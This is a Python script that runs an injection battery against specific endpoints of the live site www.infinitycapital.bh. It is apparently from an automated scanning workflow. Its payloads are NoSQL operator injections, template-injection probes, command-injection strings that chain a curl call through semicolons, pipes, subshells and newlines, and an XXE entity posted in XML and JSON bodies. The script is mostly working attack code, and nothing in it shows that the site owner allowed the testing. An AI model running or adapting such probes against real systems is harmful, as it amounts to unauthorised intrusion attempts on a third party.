#!/usr/bin/env python3
"""Injection battery: NoSQLi / SSTI / CMDi / XXE with differential + timing oracles
on the origin-reachable endpoints of www.infinitycapital.bh."""
import subprocess, os, time, hashlib

B = "https://www.infinitycapital.bh"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/" + "1" + "24.0.0.0 Safari/537.36")
log = []

def get(url, hdrs=None, post=None, ctype=None):
    cmd = ["curl", "-sk", "-m", "20", "-A", UA,
           "-D", "tool_outputs/inj.hdr", "-o", "tool_outputs/inj.body",
           "-w", "%{http_code}|%{size_download}|%{time_total}"]
    for hv in (hdrs or []):
        cmd += ["-H", hv]
    if post is not None:
        cmd += ["-X", "POST", "--data-binary", post]
        if ctype:
            cmd += ["-H", "Content-Type: " + ctype]
    r = subprocess.run(cmd + [url], capture_output=True, text=True)
    body = open("tool_outputs/inj.body", errors="replace").read() \
        if os.path.exists("tool_outputs/inj.body") else ""
    try:
        code, size, tt = r.stdout.split("|")
    except Exception:
        code, size, tt = r.stdout, "0", "0"
    return code, size, float(tt or 0), body

def record(label, url, payload, base, res):
    code, size, tt, body = res
    delta = tt - base[2]
    sig = hashlib.md5(body.encode()).hexdigest()[:8]
    ref = "REFLECTED" if "INJX77" in body else "no"
    line = ("%-22s code=%-4s size=%-7s dT=%+.3f md5=%s refl=%s | %s"
            % (label, code, size, delta, sig, ref, url))
    log.append(line)
    print(line, flush=True)

# ---------- endpoints that reach origin ----------
EP = [
    "https://www.infinitycapital.bh/404?q=INJX77",
    "https://www.infinitycapital.bh/api?id=INJX77",
    "https://www.infinitycapital.bh/_next/image?url=INJX77&w=640&q=75",
    "https://www.infinitycapital.bh/_next/image?url=%2Ffoo&w=INJX77&q=75",
    "https://www.infinitycapital.bh/_next/image?url=%2Ffoo&w=640&q=INJX77",
]

print("### BASELINES + NoSQLi + SSTI + CMDi ###", flush=True)
for base_url in EP:
    b = get(base_url)
    record("BASELINE", base_url, "-", b, b)

    # NoSQLi operators
    for nm, pl in [
        ("nosqli_ne",    "INJX77%5B%24ne%5D=1"),
        ("nosqli_gt",    "INJX77%5B%24gt%5D="),
        ("nosqli_regex", "INJX77%5B%24regex%5D=.*"),
        ("nosqli_exists","INJX77%5B%24exists%5D=true"),
        ("nosqli_where", "%7B%22id%22%3A%7B%22%24ne%22%3Anull%7D%7D"),
    ]:
        record(nm, base_url, pl, b, get(base_url.split("INJX77")[0] + pl))

    # SSTI
    for nm, pl in [
        ("ssti_ari",     "%7B%7B7*7%7D%7D"),
        ("ssti_django",  "%7B%25+7*7+%25%7D"),
        ("ssti_astro",   "%7B%7B+7*7+%7D%7D"),
        ("ssti_freemark","%24%7B7*7%7D"),
        ("ssti_erubi",   "%3C%25%3D+7*7+%25%3E"),
    ]:
        record(nm, base_url, pl, b, get(base_url.split("INJX77")[0] + pl))

    # CMDi
    for nm, pl in [
        ("cmdi_semi",    "INJX77%3Bcurl+http%3A%2F%2F127.0.0.1%2Fcmdi"),
        ("cmdi_sub",     "INJX77%24(curl+http%3A%2F%2F127.0.0.1%2Fcmdi)"),
        ("cmdi_pipe",    "INJX77%7Ccurl+http%3A%2F%2F127.0.0.1%2Fcmdi"),
        ("cmdi_nl",      "INJX77%0acurl+http%3A%2F%2F127.0.0.1%2Fcmdi"),
    ]:
        record(nm, base_url, pl, b, get(base_url.split("INJX77")[0] + pl))

print("\n### XXE via POST bodies ###", flush=True)
XXE = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM '
       '"http://127.0.0.1/xxe_probe">]><r>&x;</r>')
for ep in ["https://www.infinitycapital.bh/404", "https://www.infinitycapital.bh/api",
           "https://www.infinitycapital.bh/"]:
    for ct in ["application/xml", "text/xml", "application/json"]:
        b = get(ep)
        r = get(ep, post=XXE, ctype=ct)
        record("xxe_" + ct.split("/")[-1], ep, ct, b, r)
        r2 = get(ep, post='{"q":"INJX77","xml":' + repr(XXE)[1:-1] + '}',
                 ctype="application/json")
        record("xxe_jsonembed", ep, "json", b, r2)

open("tool_outputs/injection_battery.log", "w").write("\n".join(log))
print("\nlines=%d" % len(log))
